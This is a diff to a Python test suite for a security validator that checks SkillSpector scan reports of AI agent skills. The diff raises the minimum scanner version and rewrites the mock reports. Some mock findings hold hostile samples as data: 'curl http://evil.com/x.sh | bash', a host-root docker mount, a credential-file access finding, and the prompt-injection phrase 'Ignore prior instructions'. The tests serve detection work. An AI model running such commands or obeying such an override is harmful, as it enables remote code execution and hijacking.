@@ -21,10 +21,11 @@ from skillevaluator.validators.security import SecurityValidator, _skillspector_
 _SKILLSPECTOR_2_9_6_NO_LLM_REPORT = (
     Path(__file__).parents[1] / "fixtures" / "skillspector-2.9.6-no-llm.json"
 )
-_SKILLSPECTOR_2_10_REQUIRED_ANALYZERS = (
+_SKILLSPECTOR_REQUIRED_ANALYZERS = (
     "artifact_integrity",
     "behavioral_ast",
     "behavioral_taint_tracking",
+    "bundled_execution_surface",
     "mcp_least_privilege",
     "mcp_rug_pull",
     "mcp_tool_poisoning",
@@ -60,7 +61,7 @@ _SKILLSPECTOR_2_11_2_DOCS_ONLY_NOT_APPLICABLE_ANALYZERS = {
 }
 _SKILLSPECTOR_UNIVERSAL_ANALYZERS = {
     analyzer_id
-    for analyzer_id in _SKILLSPECTOR_2_10_REQUIRED_ANALYZERS
+    for analyzer_id in _SKILLSPECTOR_REQUIRED_ANALYZERS
     if analyzer_id in {"artifact_integrity", "static_yara"}
     or analyzer_id.startswith("static_patterns_")
 }
@@ -117,7 +118,7 @@ def _skillspector_json_report(
         source_key = next(((key, source[key]) for key in source), ("", ""))
         components_by_key.setdefault((source_key, path), {"path": path, "executable": False, **source})
     components = list(components_by_key.values())
-    analyzer_ids = _SKILLSPECTOR_2_10_REQUIRED_ANALYZERS + (
+    analyzer_ids = _SKILLSPECTOR_REQUIRED_ANALYZERS + (
         _SKILLSPECTOR_SEMANTIC_ANALYZERS if llm_requested else ()
     )
     return {
@@ -167,7 +168,7 @@ def _skillspector_json_report(
         },
         "metadata": {
             "has_executable_scripts": False,
-            "skillspector_version": "2.10.0",
+            "skillspector_version": "2.12.0",
             "llm_requested": llm_requested,
             "llm_available": llm_available,
             "meta_analysis_applied": False,
@@ -225,19 +226,6 @@ def _skillspector_documentation_only_report() -> dict:
             "fully_inspected_files": 1,
             "is_complete": False,
             "status": "partial",
-        }
-    )
-    payload["analysis_completeness"]["analyzer_statuses"].append(
-        {
-            "analyzer_id": "bundled_execution_surface",
-            "status": "not_applicable",
-            "planned_work": 0,
-            "completed": 0,
-            "partial": 0,
-            "skipped": 0,
-            "failed": 0,
-            "unaccounted": 0,
-            "reason_code": "no_applicable_files",
         }
     )
     for status in payload["analysis_completeness"]["analyzer_statuses"]:
@@ -1480,21 +1468,17 @@ Call us at 555-123-4567 or +1-555-987-6543
         mock_tools.skillspector.run.return_value = ToolResult(
             success=False,
             stdout=json.dumps(
-                {
-                    "risk_assessment": {"score": 80, "severity": "HIGH", "recommendation": "DO_NOT_INSTALL"},
-                    "issues": [
-                        {
-                            "id": "PI-1",
-                            "category": "Prompt Injection",
-                            "pattern": "Instruction override",
-                            "severity": "HIGH",
-                            "confidence": 1.0,
-                            "finding": "Ignore prior instructions",
-                            "location": {"file": "SKILL.md", "start_line": 8},
-                        }
-                    ],
-                    "metadata": {"skillspector_version": "1.0.0"},
-                }
+                _skillspector_json_report([
+                    {
+                        "id": "PI-1",
+                        "category": "Prompt Injection",
+                        "pattern": "Instruction override",
+                        "severity": "HIGH",
+                        "confidence": 1.0,
+                        "finding": "Ignore prior instructions",
+                        "location": {"file": "SKILL.md", "start_line": 8},
+                    }
+                ])
             ),
             stderr="",
             exit_code=1,
@@ -2233,13 +2217,16 @@ Call us at 555-123-4567 or +1-555-987-6543
         assert result.status == "incomplete"
         assert any("--no-llm" in error for error in result.errors)
 
+    @pytest.mark.parametrize("version", ["2.12.0", "2.12.1", "2.13.0", "3.0.0"])
     @patch("skillevaluator.validators.security.Tools")
     def test_skillspector_accepts_valid_clean_report(
         self,
         mock_tools,
         sample_skill_dir: Path,
+        version: str,
     ) -> None:
         payload = _skillspector_json_report()
+        payload["metadata"]["skillspector_version"] = version
         mock_tools.skillspector.is_available = True
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
@@ -2254,8 +2241,31 @@ Call us at 555-123-4567 or +1-555-987-6543
         assert not result.errors
         assert any(detail.check_name == "skillspector" for detail in result.success_details)
 
+    @pytest.mark.parametrize("version", ["2.10.0", "2.11.1", "2.11.2", "2.11.99"])
+    @pytest.mark.parametrize("use_llm", [False, True])
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_accepts_fully_covered_documentation_only_report(
+    def test_skillspector_rejects_versions_below_minimum(
+        self, mock_tools, sample_skill_dir: Path, version: str, use_llm: bool,
+    ) -> None:
+        payload = _skillspector_json_report(llm_requested=use_llm, llm_available=use_llm)
+        payload["metadata"]["skillspector_version"] = version
+        mock_tools.skillspector.run.return_value = ToolResult(
+            success=True, stdout=json.dumps(payload), stderr="", exit_code=0,
+        )
+
+        result = SecurityValidator()._run_skillspector_once(
+            sample_skill_dir, original_root=None, use_llm=use_llm,
+        )
+
+        assert result.is_incomplete
+        assert result.incomplete_scans == ["skillspector-llm" if use_llm else "skillspector"]
+        assert any(f"2.12.0 or newer is required; found {version}" in error for error in result.errors)
+        assert any("uv tool install --upgrade" in error for error in result.errors)
+        assert not result.findings
+        assert not result.success_details
+
+    @patch("skillevaluator.validators.security.Tools")
+    def test_skillspector_rejects_legacy_documentation_only_report(
         self,
         mock_tools,
         sample_skill_dir: Path,
@@ -2264,9 +2274,9 @@ Call us at 555-123-4567 or +1-555-987-6543
 
         result = _validate_skillspector_payload(mock_tools, sample_skill_dir, payload)
 
-        assert result.passed
-        assert not result.errors
-        assert any(detail.check_name == "skillspector" for detail in result.success_details)
+        assert result.is_incomplete
+        assert any("2.12.0 or newer is required; found 2.11.2" in error for error in result.errors)
+        assert not result.success_details
 
     @pytest.mark.parametrize(
         "invalid_evidence",
@@ -2353,9 +2363,9 @@ Call us at 555-123-4567 or +1-555-987-6543
         assert result.is_incomplete
         assert not any(detail.check_name == "skillspector" for detail in result.success_details)
 
-    @pytest.mark.parametrize("version", ["2.9.5-safe", "2.9.6", "2.11.1-safe"])
+    @pytest.mark.parametrize("version", ["2.9.5-safe", "2.9.6", "2.11.1-safe", "2.12.0-safe"])
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_accepts_captured_no_llm_report(
+    def test_skillspector_checks_minimum_version_of_captured_no_llm_report(
         self,
         mock_tools,
         sample_skill_dir: Path,
@@ -2373,13 +2383,18 @@ Call us at 555-123-4567 or +1-555-987-6543
 
         result = SecurityValidator(use_llm=False).validate_security_only(sample_skill_dir)
 
-        assert result.passed
-        assert not result.errors
-        assert any(detail.check_name == "skillspector" for detail in result.success_details)
+        if version == "2.12.0-safe":
+            assert result.passed
+            assert not result.errors
+            assert any(detail.check_name == "skillspector" for detail in result.success_details)
+        else:
+            assert result.is_incomplete
+            assert any("2.12.0 or newer is required" in error for error in result.errors)
+            assert not result.success_details
 
-    @pytest.mark.parametrize("version", ["2.10.0", "2.11.0", "2.11.1"])
+    @pytest.mark.parametrize("version", ["2.12.0", "2.12.1"])
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_requires_bundled_execution_surface_since_2_11(
+    def test_skillspector_requires_bundled_execution_surface(
         self, mock_tools, sample_skill_dir: Path, version: str,
     ) -> None:
         payload = json.loads((
@@ -2391,11 +2406,8 @@ Call us at 555-123-4567 or +1-555-987-6543
             if item["analyzer_id"] != "bundled_execution_surface"
         ]
         result = _validate_skillspector_payload(mock_tools, sample_skill_dir, payload)
-        if version == "2.10.0":
-            assert result.passed
-        else:
-            assert result.is_incomplete
-            assert any("missing required analyzer evidence" in error for error in result.errors)
+        assert result.is_incomplete
+        assert any("missing required analyzer evidence" in error for error in result.errors)
 
     @pytest.mark.parametrize(
         "mutation", [None, "finding_id", "score", "count", "old-version", "expanded", "evidence-types"]
@@ -2410,6 +2422,8 @@ Call us at 555-123-4567 or +1-555-987-6543
         payload = json.loads((
             Path(__file__).parents[1] / "fixtures" / "skillspector-2.11.1-pe3-no-llm.json"
         ).read_text(encoding="utf-8"))
+        # Exercise the captured finding shape against the current minimum version.
+        payload["metadata"]["skillspector_version"] = "2.12.0"
         first, second = [issue for issue in payload["issues"] if issue["id"] == "PE3"]
         assert first["match_fingerprint"] == second["match_fingerprint"]
         assert first["finding_id"] != second["finding_id"]
@@ -2531,7 +2545,7 @@ Call us at 555-123-4567 or +1-555-987-6543
         assert any("metadata.llm_requested" in error for error in result.errors)
 
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_accepts_legacy_report_without_completeness(
+    def test_skillspector_rejects_legacy_report_without_completeness(
         self,
         mock_tools,
         sample_skill_dir: Path,
@@ -2542,8 +2556,8 @@ Call us at 555-123-4567 or +1-555-987-6543
         payload.pop("analysis_completeness")
         result = _validate_skillspector_payload(mock_tools, sample_skill_dir, payload)
 
-        assert result.passed
-        assert not result.errors
+        assert result.is_incomplete
+        assert any("2.12.0 or newer is required; found 1.0.0" in error for error in result.errors)
 
     @pytest.mark.parametrize("version", ["2.9.6", "2.10.0", "2.11.0"])
     @pytest.mark.parametrize("missing_field", ["execution_successful", "analysis_completeness"])
@@ -2971,7 +2985,7 @@ Call us at 555-123-4567 or +1-555-987-6543
             }
             for file_name in ("a.md", "b.md")
         ]
-        payload = json.loads(_SKILLSPECTOR_2_9_6_NO_LLM_REPORT.read_text(encoding="utf-8"))
+        payload = _skillspector_json_report(issues)
         payload["issues"] = issues
         payload["components"] = [
             {"path": file_name, "executable": False} for file_name in ("a.md", "b.md")
@@ -4053,18 +4067,7 @@ Call us at 555-123-4567 or +1-555-987-6543
     def test_validate_security_only_with_llm(self, mock_tools, sample_skill_dir: Path):
         """Test validate_security_only with LLM runs CLI without --no-llm."""
         mock_tools.skillspector.is_available = True
-        cli_json = {
-            "skill": {"name": "test", "source": "/tmp", "scanned_at": "2026-01-01T00:00:00Z"},
-            "risk_assessment": {"score": 0, "severity": "LOW", "recommendation": "SAFE"},
-            "components": [],
-            "issues": [],
-            "metadata": {
-                "has_executable_scripts": False,
-                "skillspector_version": "1.0.0",
-                "llm_requested": True,
-                "llm_available": True,
-            },
-        }
+        cli_json = _skillspector_json_report(llm_requested=True, llm_available=True)
         mock_tools.skillspector.run.side_effect = [
             ToolResult(
                 success=True,
@@ -4079,6 +4082,7 @@ Call us at 555-123-4567 or +1-555-987-6543
         result = validator.validate_security_only(sample_skill_dir)
 
         assert result is not None
+        assert not result.is_incomplete
         call_args = mock_tools.skillspector.run.call_args[0][0]
         assert "--no-llm" not in call_args
 
@@ -4086,23 +4090,8 @@ Call us at 555-123-4567 or +1-555-987-6543
     def test_finding_uses_explanation_and_remediation_from_skillspector(self, mock_tools, sample_skill_dir: Path):
         """Test that findings use skillspector CLI explanation and remediation for suggestion."""
         mock_tools.skillspector.is_available = True
-        cli_json = {
-            "skill": {
-                "name": "test-skill",
-                "source": "/tmp/test",
-                "scanned_at": "2026-01-01T00:00:00Z",
-            },
-            "risk_assessment": {"score": 50, "severity": "MEDIUM", "recommendation": "CAUTION"},
-            "components": [
-                {
-                    "path": "scripts/connections.py",
-                    "type": "python",
-                    "lines": 100,
-                    "executable": True,
-                    "size_bytes": 3000,
-                }
-            ],
-            "issues": [
+        cli_json = _skillspector_json_report(
+            [
                 {
                     "id": "PE3",
                     "category": "Privilege Escalation",
@@ -4112,22 +4101,17 @@ Call us at 555-123-4567 or +1-555-987-6543
                     "finding": ".env",
                     "explanation": "Code accesses credential files (SSH keys, AWS credentials, etc.).",
                     "remediation": "Remove references to credential paths. Use environment variables.",
-                    "location": {
-                        "file": "scripts/connections.py",
-                        "start_line": 80,
-                        "end_line": None,
-                    },
+                    "location": {"file": "scripts/connections.py", "start_line": 80, "end_line": None},
                     "code_snippet": "self.command = command",
                     "intent": None,
                 }
-            ],
-            "metadata": {
-                "has_executable_scripts": True,
-                "skillspector_version": "1.0.0",
-                "llm_requested": False,
-                "llm_available": False,
-            },
-        }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 50, "severity": "MEDIUM", "recommendation": "CAUTION"}
+        cli_json["components"] = [
+            {"path": "scripts/connections.py", "type": "python", "lines": 100, "executable": True, "size_bytes": 3000}
+        ]
+        cli_json["metadata"]["has_executable_scripts"] = True
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
             stdout=json.dumps(cli_json),
@@ -4138,6 +4122,7 @@ Call us at 555-123-4567 or +1-555-987-6543
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(sample_skill_dir)
 
+        assert not result.is_incomplete
         assert len(result.findings) >= 1
         finding = next(f for f in result.findings if f.check_name == "Credential Access (PE3)")
         assert "credential" in (finding.suggestion or "").lower()
@@ -4223,23 +4208,8 @@ Call us at 555-123-4567 or +1-555-987-6543
     def test_skillspector_findings_for_generated_artifacts_are_ignored(self, mock_tools, sample_skill_dir: Path):
         """Generated publishing artifacts should not fail Tier 1 security scanning."""
         mock_tools.skillspector.is_available = True
-        cli_json = {
-            "skill": {
-                "name": "sample-skill",
-                "source": "/tmp/sample",
-                "scanned_at": "2026-01-01T00:00:00Z",
-            },
-            "risk_assessment": {"score": 22, "severity": "MEDIUM", "recommendation": "CAUTION"},
-            "components": [
-                {
-                    "path": "skill-card.md",
-                    "type": "markdown",
-                    "lines": 20,
-                    "executable": False,
-                    "size_bytes": 500,
-                }
-            ],
-            "issues": [
+        cli_json = _skillspector_json_report(
+            [
                 {
                     "id": "SQP-2",
                     "category": "Skill Quality",
@@ -4253,14 +4223,12 @@ Call us at 555-123-4567 or +1-555-987-6543
                     "code_snippet": "Outputs: Files",
                     "intent": None,
                 }
-            ],
-            "metadata": {
-                "has_executable_scripts": False,
-                "skillspector_version": "1.0.0",
-                "llm_requested": False,
-                "llm_available": False,
-            },
-        }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 22, "severity": "MEDIUM", "recommendation": "CAUTION"}
+        cli_json["components"] = [
+            {"path": "skill-card.md", "type": "markdown", "lines": 20, "executable": False, "size_bytes": 500}
+        ]
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
             stdout=json.dumps(cli_json),
@@ -4271,6 +4239,7 @@ Call us at 555-123-4567 or +1-555-987-6543
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(sample_skill_dir)
 
+        assert not result.is_incomplete
         assert result.passed
         assert result.findings == []
 
@@ -4278,21 +4247,10 @@ Call us at 555-123-4567 or +1-555-987-6543
     def test_validate_security_only_without_llm(self, mock_tools, sample_skill_dir: Path):
         """Test validate_security_only without LLM runs CLI with --no-llm."""
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report()
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "skill": {
-                        "name": "test",
-                        "source": "/tmp",
-                        "scanned_at": "2026-01-01T00:00:00Z",
-                    },
-                    "risk_assessment": {"score": 0, "severity": "LOW", "recommendation": "SAFE"},
-                    "components": [],
-                    "issues": [],
-                    "metadata": {"has_executable_scripts": False, "skillspector_version": "1.0.0"},
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=0,
         )
@@ -4301,6 +4259,7 @@ Call us at 555-123-4567 or +1-555-987-6543
         result = validator.validate_security_only(sample_skill_dir)
 
         assert result is not None
+        assert not result.is_incomplete
         call_args = mock_tools.skillspector.run.call_args[0][0]
         assert "--no-llm" in call_args
 
@@ -4853,50 +4812,35 @@ class TestFalsePositivePrevention:
         assert not SecurityValidator._passes_luhn("4532123456789010")
         assert not SecurityValidator._passes_luhn("1111111111111112")
 
-    # --- Skillspector 1.0 field handling tests ---
+    # --- SkillSpector field handling tests ---
 
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_10_confidence_captured(self, mock_tools, sample_skill_dir: Path):
-        """Skillspector 1.0 confidence float is captured in finding metadata."""
+    def test_skillspector_confidence_captured(self, mock_tools, sample_skill_dir: Path):
+        """SkillSpector confidence float is captured in finding metadata."""
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report(
+            [
+                {
+                    "id": "TM1",
+                    "category": "Tool Misuse",
+                    "pattern": "Tool Parameter Abuse",
+                    "severity": "HIGH",
+                    "confidence": 0.95,
+                    "finding": "docker run --rm",
+                    "explanation": "Dangerous docker usage.",
+                    "remediation": "Use safe defaults.",
+                    "location": {"file": "run.sh", "start_line": 5, "end_line": None},
+                    "code_snippet": "docker run --rm -v /:/host",
+                    "intent": "container_execution",
+                }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 40, "severity": "MEDIUM", "recommendation": "CAUTION"}
+        cli_json["metadata"]["has_executable_scripts"] = True
+        cli_json["components"][0]["executable"] = True
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "skill": {
-                        "name": "test",
-                        "source": "/tmp",
-                        "scanned_at": "2026-01-01T00:00:00Z",
-                    },
-                    "risk_assessment": {
-                        "score": 40,
-                        "severity": "MEDIUM",
-                        "recommendation": "CAUTION",
-                    },
-                    "components": [],
-                    "issues": [
-                        {
-                            "id": "TM1",
-                            "category": "Tool Misuse",
-                            "pattern": "Tool Parameter Abuse",
-                            "severity": "HIGH",
-                            "confidence": 0.95,
-                            "finding": "docker run --rm",
-                            "explanation": "Dangerous docker usage.",
-                            "remediation": "Use safe defaults.",
-                            "location": {"file": "run.sh", "start_line": 5, "end_line": None},
-                            "code_snippet": "docker run --rm -v /:/host",
-                            "intent": "container_execution",
-                        }
-                    ],
-                    "metadata": {
-                        "has_executable_scripts": True,
-                        "skillspector_version": "1.0.0",
-                        "llm_requested": False,
-                        "llm_available": False,
-                    },
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=0,
         )
@@ -4904,49 +4848,40 @@ class TestFalsePositivePrevention:
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(sample_skill_dir)
 
+        assert not result.is_incomplete
         assert len(result.findings) >= 1
         finding = result.findings[0]
         assert finding.metadata.get("skillspector_confidence") == 0.95
         assert finding.metadata.get("intent") == "container_execution"
-        assert result.metadata.get("skillspector_version") == "1.0.0"
-        assert result.metadata.get("skillspector_components_count") == 0
+        assert result.metadata.get("skillspector_version") == "2.12.0"
+        assert result.metadata.get("skillspector_components_count") == 1
         assert result.metadata.get("skillspector_has_executable_scripts") is True
 
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_10_null_finding_uses_explanation_fallback(self, mock_tools, sample_skill_dir: Path):
+    def test_skillspector_null_finding_uses_explanation_fallback(self, mock_tools, sample_skill_dir: Path):
         """When skillspector returns null for finding field, message falls back to explanation."""
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report(
+            [
+                {
+                    "id": "SQP1",
+                    "category": "Quality Policy",
+                    "pattern": None,
+                    "severity": "MEDIUM",
+                    "confidence": 0.7,
+                    "finding": None,
+                    "explanation": "Trigger description is too broad and may cause false activations.",
+                    "remediation": "Narrow the trigger to specific terms.",
+                    "location": {"file": "SKILL.md", "start_line": 3, "end_line": None},
+                    "code_snippet": None,
+                    "intent": None,
+                }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 30, "severity": "MEDIUM", "recommendation": "CAUTION"}
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "risk_assessment": {
-                        "score": 30,
-                        "severity": "MEDIUM",
-                        "recommendation": "CAUTION",
-                    },
-                    "issues": [
-                        {
-                            "id": "SQP1",
-                            "category": "Quality Policy",
-                            "pattern": None,
-                            "severity": "MEDIUM",
-                            "confidence": 0.7,
-                            "finding": None,
-                            "explanation": "Trigger description is too broad and may cause false activations.",
-                            "remediation": "Narrow the trigger to specific terms.",
-                            "location": {"file": "SKILL.md", "start_line": 3, "end_line": None},
-                            "code_snippet": None,
-                            "intent": None,
-                        }
-                    ],
-                    "metadata": {
-                        "skillspector_version": "1.0.0",
-                        "llm_requested": False,
-                        "llm_available": False,
-                    },
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=0,
         )
@@ -4954,6 +4889,7 @@ class TestFalsePositivePrevention:
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(sample_skill_dir)
 
+        assert not result.is_incomplete
         assert len(result.findings) >= 1
         finding = result.findings[0]
         assert "None" not in finding.message
@@ -4964,33 +4900,27 @@ class TestFalsePositivePrevention:
     def test_skillspector_issue_without_required_fields_fails_closed(self, mock_tools, sample_skill_dir: Path):
         """An issue without a severity or usable content is not trustworthy evidence."""
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report(
+            [
+                {
+                    "id": "X1",
+                    "category": None,
+                    "pattern": None,
+                    "severity": None,
+                    "confidence": None,
+                    "finding": None,
+                    "explanation": None,
+                    "remediation": None,
+                    "location": None,
+                    "code_snippet": None,
+                    "intent": None,
+                }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 20, "severity": "LOW", "recommendation": "SAFE"}
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "risk_assessment": {
-                        "score": 20,
-                        "severity": "LOW",
-                        "recommendation": "SAFE",
-                    },
-                    "issues": [
-                        {
-                            "id": "X1",
-                            "category": None,
-                            "pattern": None,
-                            "severity": None,
-                            "confidence": None,
-                            "finding": None,
-                            "explanation": None,
-                            "remediation": None,
-                            "location": None,
-                            "code_snippet": None,
-                            "intent": None,
-                        }
-                    ],
-                    "metadata": {"llm_requested": False, "llm_available": False},
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=0,
         )
@@ -5003,44 +4933,23 @@ class TestFalsePositivePrevention:
         assert any("severity" in error.lower() for error in result.errors)
 
     @patch("skillevaluator.validators.security.Tools")
-    def test_skillspector_10_metadata_captured(self, mock_tools, sample_skill_dir: Path):
-        """Top-level skill, components, and metadata from skillspector 1.0 are captured."""
+    def test_skillspector_metadata_captured(self, mock_tools, sample_skill_dir: Path):
+        """Top-level skill, components, and metadata from SkillSpector are captured."""
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report()
+        cli_json["skill"] = {"name": "my-skill", "source": "/path/to/skill", "scanned_at": "2026-03-20T00:00:00Z"}
+        cli_json["components"] = [
+            {"path": "SKILL.md", "type": "markdown", "lines": 50, "executable": False, "size_bytes": 1500},
+            {"path": "run.sh", "type": "shell", "lines": 10, "executable": True, "size_bytes": 300},
+        ]
+        cli_json["analysis_completeness"].update(
+            {"total_components": 2, "scanned_components": 2, "fully_inspected_files": 2}
+        )
+        _set_universal_analyzer_work(cli_json)
+        cli_json["metadata"]["has_executable_scripts"] = True
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "skill": {
-                        "name": "my-skill",
-                        "source": "/path/to/skill",
-                        "scanned_at": "2026-03-20T00:00:00Z",
-                    },
-                    "risk_assessment": {"score": 0, "severity": "LOW", "recommendation": "SAFE"},
-                    "components": [
-                        {
-                            "path": "SKILL.md",
-                            "type": "markdown",
-                            "lines": 50,
-                            "executable": False,
-                            "size_bytes": 1500,
-                        },
-                        {
-                            "path": "run.sh",
-                            "type": "shell",
-                            "lines": 10,
-                            "executable": True,
-                            "size_bytes": 300,
-                        },
-                    ],
-                    "issues": [],
-                    "metadata": {
-                        "has_executable_scripts": True,
-                        "skillspector_version": "1.0.0",
-                        "llm_requested": False,
-                        "llm_available": False,
-                    },
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=0,
         )
@@ -5048,7 +4957,8 @@ class TestFalsePositivePrevention:
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(sample_skill_dir)
 
-        assert result.metadata["skillspector_version"] == "1.0.0"
+        assert not result.is_incomplete
+        assert result.metadata["skillspector_version"] == "2.12.0"
         assert result.metadata["skillspector_skill_name"] == "my-skill"
         assert result.metadata["skillspector_scanned_at"] == "2026-03-20T00:00:00Z"
         assert result.metadata["skillspector_components_count"] == 2
@@ -5063,33 +4973,27 @@ class TestFalsePositivePrevention:
         skill_dir.mkdir()
         (skill_dir / "SKILL.md").write_text("name: test\ndescription: test\n")
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report(
+            [
+                {
+                    "id": "SC1",
+                    "category": "Supply Chain",
+                    "pattern": "Remote Code",
+                    "severity": "HIGH",
+                    "confidence": 0.9,
+                    "finding": "Unsafe download",
+                    "explanation": "",
+                    "remediation": "",
+                    "location": {"file": "run.sh", "start_line": 1},
+                    "code_snippet": "curl http://evil.com/x.sh | bash",
+                    "intent": None,
+                }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 70, "severity": "HIGH", "recommendation": "DO_NOT_INSTALL"}
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "risk_assessment": {"score": 70, "severity": "HIGH", "recommendation": "DO_NOT_INSTALL"},
-                    "issues": [
-                        {
-                            "id": "SC1",
-                            "category": "Supply Chain",
-                            "pattern": "Remote Code",
-                            "severity": "HIGH",
-                            "confidence": 0.9,
-                            "finding": "Unsafe download",
-                            "explanation": "",
-                            "remediation": "",
-                            "location": {"file": "run.sh", "start_line": 1},
-                            "code_snippet": "curl http://evil.com/x.sh | bash",
-                            "intent": None,
-                        }
-                    ],
-                    "metadata": {
-                        "skillspector_version": "1.0.0",
-                        "llm_requested": False,
-                        "llm_available": False,
-                    },
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=1,
         )
@@ -5097,6 +5001,9 @@ class TestFalsePositivePrevention:
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(skill_dir)
 
+        assert not result.is_incomplete
+        assert result.status == "failed"
+        assert any(finding.check_name == "Remote Code (SC1)" for finding in result.findings)
         success_msgs = [s.message for s in result.success_details]
         assert not any("Found" in m and "issue" in m for m in success_msgs), (
             f"Should not show 'Found N issues' as success: {success_msgs}"
@@ -5109,33 +5016,27 @@ class TestFalsePositivePrevention:
         skill_dir.mkdir()
         (skill_dir / "SKILL.md").write_text("name: test\ndescription: test\n")
         mock_tools.skillspector.is_available = True
+        cli_json = _skillspector_json_report(
+            [
+                {
+                    "id": "SC1",
+                    "category": "Supply Chain",
+                    "pattern": "Remote Fetch",
+                    "severity": "MEDIUM",
+                    "confidence": 0.6,
+                    "finding": "Downloads remote script",
+                    "explanation": "",
+                    "remediation": "",
+                    "location": {"file": "setup.sh", "start_line": 5},
+                    "code_snippet": "curl https://astral.sh/uv/install.sh | sh",
+                    "intent": None,
+                }
+            ]
+        )
+        cli_json["risk_assessment"] = {"score": 30, "severity": "MEDIUM", "recommendation": "CAUTION"}
         mock_tools.skillspector.run.return_value = ToolResult(
             success=True,
-            stdout=json.dumps(
-                {
-                    "risk_assessment": {"score": 30, "severity": "MEDIUM", "recommendation": "CAUTION"},
-                    "issues": [
-                        {
-                            "id": "SC1",
-                            "category": "Supply Chain",
-                            "pattern": "Remote Fetch",
-                            "severity": "MEDIUM",
-                            "confidence": 0.6,
-                            "finding": "Downloads remote script",
-                            "explanation": "",
-                            "remediation": "",
-                            "location": {"file": "setup.sh", "start_line": 5},
-                            "code_snippet": "curl https://astral.sh/uv/install.sh | sh",
-                            "intent": None,
-                        }
-                    ],
-                    "metadata": {
-                        "skillspector_version": "1.0.0",
-                        "llm_requested": False,
-                        "llm_available": False,
-                    },
-                }
-            ),
+            stdout=json.dumps(cli_json),
             stderr="",
             exit_code=0,
         )
@@ -5143,6 +5044,7 @@ class TestFalsePositivePrevention:
         validator = SecurityValidator(use_llm=False)
         result = validator.validate_security_only(skill_dir)
 
+        assert not result.is_incomplete
         success_msgs = [s.message for s in result.success_details]
         assert any("advisory" in m.lower() or "no critical" in m.lower() for m in success_msgs), (
             f"Should show advisory message: {success_msgs}"
